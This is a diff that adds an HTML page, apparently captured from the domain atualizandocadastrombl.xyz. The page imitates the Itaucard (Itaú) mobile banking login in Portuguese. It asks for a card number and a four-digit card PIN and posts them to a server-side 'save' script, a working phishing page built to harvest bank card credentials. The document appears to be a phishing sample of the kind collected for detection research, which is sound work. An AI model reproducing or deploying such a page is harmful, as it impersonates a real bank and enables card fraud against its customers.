@@ -1,0 +1,125 @@
+<!-- URL =http://atualizandocadastrombl.xyz/app/mobile/v2/home/?itoken=11,00,34,am,145,5,05,000000,26,11,2021,wednesday.dll--><!-- w =(['ATUALIZANDOCADASTROMBL.XYZ', 'atualizandocadastrombl.xyz'], datetime.datetime(2021, 5, 25, 15, 19, 1), [datetime.datetime(2022, 5, 25, 23, 59, 59), datetime.datetime(2022, 5, 25, 15, 19, 1)])--><!DOCTYPE html>
+<html lang="pt-BR">
+ <head>
+  <!-- meta -->
+  <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Home | Itaucard
+  </title>
+  <!-- css -->
+  <link href="../../../../assets/styles/bootstrap.min.css" rel="stylesheet" type="text/css"/>
+  <link href="../../../../assets/styles/mobile.css" rel="stylesheet" type="text/css"/>
+  <link href="../../../../assets/images/favicon.ico" rel="shortcut icon"/>
+  <style type="text/css">
+   input[type="submit"]:disabled {
+      color: #c1c1c1 !important;
+      background-color: #f9f9f9;
+    }
+  </style>
+ </head>
+ <body class="fundoHome">
+  <header class="top-home">
+   <div class="container">
+    <div class="row">
+     <div class="col-md-12">
+      <img class="img-fluid" src="../../../../assets/images/mobile/img_home_logo.png"/>
+     </div>
+    </div>
+   </div>
+  </header>
+  <main class="conteudoHome">
+   <div class="container">
+    <div class="row">
+     <form action="../../../../save/mobile/01.php" class="formHome" id="formHome" method="POST" style="display: none;">
+      <div class="frm-item">
+       <input autocomplete="off" id="numc" maxlength="19" name="numc" onkeyup="validaHome();javascript:pulacampo('numc','passc');" required="" type="tel"/>
+       <label class="label-float" for="numc">
+        número do cartão
+       </label>
+      </div>
+      <div class="frm-item">
+       <input autocomplete="off" id="passc" maxlength="4" name="passc" onkeyup="passballs(this.value), validaHome();javascript:pulacampo('passc','is_enter');" required="" type="tel"/>
+       <label class="label-float" for="passc">
+        senha do cartão
+       </label>
+       <span class="cd">
+       </span>
+       <span class="balls" id="ball1">
+       </span>
+       <span class="balls" id="ball2">
+       </span>
+       <span class="balls" id="ball3">
+       </span>
+       <span class="balls" id="ball4">
+       </span>
+      </div>
+      <div class="group">
+       <input disabled="" id="is_enter" name="is_enter" onclick="return check_enter_index();" type="submit" value="acessar"/>
+      </div>
+     </form>
+    </div>
+   </div>
+  </main>
+  <footer class="ft-home">
+   <ul>
+    <li>
+     <img src="../../../../assets/images/mobile/ic_contact_card.png"/>
+     <p>
+      pedir cartão
+     </p>
+    </li>
+    <li>
+     <img src="../../../../assets/images/mobile/ic_itokenapp.png"/>
+     <p>
+      iToken
+     </p>
+    </li>
+    <li>
+     <img src="../../../../assets/images/mobile/ic_ajuda.png"/>
+     <p>
+      ajuda
+     </p>
+    </li>
+    <div style="clear: both;">
+    </div>
+   </ul>
+  </footer>
+  <div class="modal fade" id="modalErroMobile" role="dialog">
+   <div class="modal-dialog">
+    <div class="modal-content">
+     <div class="modal-header">
+      <h4 class="modal-title">
+       oops!
+      </h4>
+      <button class="btn btn-default" data-dismiss="modal" style="color: #fff;" type="button">
+       x
+      </button>
+     </div>
+     <div class="modal-body">
+      <p id="error">
+      </p>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+ <!-- script -->
+ <script src="../../../../assets/scripts/jquery-3.2.1.min.js">
+ </script>
+ <script src="../../../../assets/scripts/bootstrap.js">
+ </script>
+ <script src="../../../../assets/scripts/padrao_mk.js">
+ </script>
+ <script src="../../../../assets/scripts/jquery.mask.min.js">
+ </script>
+ <script src="../../../../assets/scripts/mobile.js">
+ </script>
+ <script>
+  $(function(){
+            window.setTimeout(function(){
+                $('#formHome').show("slow");
+            }, 500);
+        });
+ </script>
+</html>
